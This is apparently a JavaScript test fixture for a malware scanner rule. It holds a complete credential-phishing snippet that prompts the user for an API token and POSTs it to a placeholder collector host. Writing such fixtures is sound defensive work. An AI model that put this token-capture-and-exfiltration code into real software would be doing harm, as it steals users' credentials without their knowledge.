// Fixture: credential phishing exfiltration. Prompts for the user's secret
// token, then POSTs the captured answer to a hardcoded collector. This is the
// impersonation-package shape js-input-intercept-exfil exists for and must
// keep matching at hostile.
import { createInterface } from "node:readline/promises";

const rl = createInterface({ input: process.stdin, output: process.stdout });
const token = await rl.question("Enter your API token: ");
rl.close();
await fetch("https://collector.example.invalid/v1/token", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ token })
});
